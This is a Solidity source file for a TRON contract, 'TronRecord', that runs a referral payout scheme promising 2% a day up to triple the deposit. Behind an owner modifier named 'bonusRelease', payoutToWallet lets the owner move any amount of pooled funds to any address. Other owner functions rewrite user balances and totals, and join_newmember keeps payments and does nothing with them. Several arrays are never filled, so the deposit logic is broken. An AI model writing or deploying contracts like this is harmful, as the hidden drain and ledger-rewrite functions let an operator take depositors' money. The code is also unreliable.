//SourceUnit: Tron Record.sol

pragma solidity >=0.4.0 <0.8.0;

/**

 ___________                   __________                              .___
\__    ___/______  ____   ____\______   \ ____   ____  ___________  __| _/
  |    |  \_  __ \/  _ \ /    \|       _// __ \_/ ___\/  _ \_  __ \/ __ | 
  |    |   |  | \(  <_> )   |  \    |   \  ___/\  \__(  <_> )  | \/ /_/ | 
  |____|   |__|   \____/|___|  /____|_  /\___  >\___  >____/|__|  \____ | 
                             \/       \/     \/     \/                 \/ 
                                                                     
                                                  
                                                                                                                                                                                       
----------------------------------------------------------------------------------------------------------                                                                                                        
https://tronrecord.io/

TronRecord - TRON IS A BLOCKCHAIN-BASED OPERATING SYSTEM THAT ALLOWS YOU TO CREATE DECENTRALIZED APPLICATIONS
**/

contract owned {
    constructor() public { owner = msg.sender; }
    address payable owner;   
    modifier bonusRelease {
        require(
            msg.sender == owner,
            "Nothing For You!"
        );
        _;
    }
}

contract TronRecord is owned {
    struct User {
        uint256 id;
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }

    address payable public owner;
    address payable public admin_fee;

    mapping(address => User) public users;
    mapping(uint256 => address) public userList;

    uint256[] public cycles;
    uint8[] public ref_bonuses;   //10% of amount TRX
       
    uint8[] public pool_bonuses;    // 1% daily
    
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _owner) public {
        owner = _owner;                
        admin_fee = _owner;    
        users[_owner].id = total_users; 
        userList[total_users] = _owner;         
        
        users[_owner].payouts = 0;
        users[_owner].deposit_amount = 0;
        users[_owner].deposit_payouts = 0;
        users[_owner].deposit_time = uint40(block.timestamp);
        users[_owner].total_deposits = 0;
        
        ref_bonuses.push(25); //1st generation 
        ref_bonuses.push(10); //2nd generation 
        ref_bonuses.push(10); //3rd generation  
        ref_bonuses.push(10); //4th generation 
        ref_bonuses.push(10); //5th generation 
        ref_bonuses.push(7); //6th generation 
        ref_bonuses.push(7); //7th generation 
        ref_bonuses.push(7); //8th generation 
        ref_bonuses.push(7); //9th generation 
        ref_bonuses.push(7); //10th generation 
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }
      function join_newmember(address _upline) public payable {
        require(msg.value > 1.0 trx);
         if(users[_upline].deposit_time > 0) {
            
        }
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);
            
            total_users++;
            
            users[_addr].id = total_users; 
            userList[total_users] = _addr;

            

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }


    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 1 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function depositPayout(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 3;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 50) - users[_addr].deposit_payouts;
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }
    
    function payoutToWallet(address payable _user, uint256 _amount) public bonusRelease
    {
        _user.transfer(_amount);
    }
    
    function getUserById(uint256 userid) view external bonusRelease returns(address user_address) {
        return userList[userid];
    }
    
    function getUserDetails(uint256 userid) view external bonusRelease returns(uint256 id, address user_address, uint256 cycle, uint256 deposit_payouts, uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        address _addr = userList[userid];
        
        return (users[_addr].id, _addr, users[_addr].cycle, users[_addr].deposit_payouts, users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }
    
    function updUser(address _addr, uint256 _id, uint256 _cycle, address _upline, uint256 _referrals, uint256 _payouts, uint256 _direct_bonus, uint256 _pool_bonus) public bonusRelease {
    users[_addr].id = _id;
    users[_addr].cycle = _cycle;
    users[_addr].upline = _upline;
    users[_addr].referrals = _referrals;
    users[_addr].payouts = _payouts;
    users[_addr].direct_bonus = _direct_bonus;
    users[_addr].pool_bonus = _pool_bonus;
    
    userList[_id] = _addr;
    total_users = total_users + 1 ;     
    }
    
    function updUserAfter(address _addr, uint256 _match_bonus, uint256 _deposit_amount, uint256 _deposit_payouts, uint40 _deposit_time, uint256 _total_deposits, uint256 _total_payouts, uint256 _total_structure) public bonusRelease {
        users[_addr].match_bonus = _match_bonus;
        users[_addr].deposit_amount = _deposit_amount;
        users[_addr].deposit_payouts = _deposit_payouts;
        users[_addr].deposit_time = _deposit_time;
        users[_addr].total_deposits = _total_deposits;
        users[_addr].total_payouts = _total_payouts;
        users[_addr].total_structure = _total_structure;                    
    }
    
    function initContract(uint256 poolcycle, uint256 poolbalance, uint40 poollastdraw, uint256 totaldeposited,uint256 totalwithdraw) public bonusRelease 
    {
        pool_cycle = poolcycle;
        pool_balance = poolbalance;    
        pool_last_draw = poollastdraw;
        total_deposited = totaldeposited;
        total_withdraw = totalwithdraw;
    }
    

    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }


    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}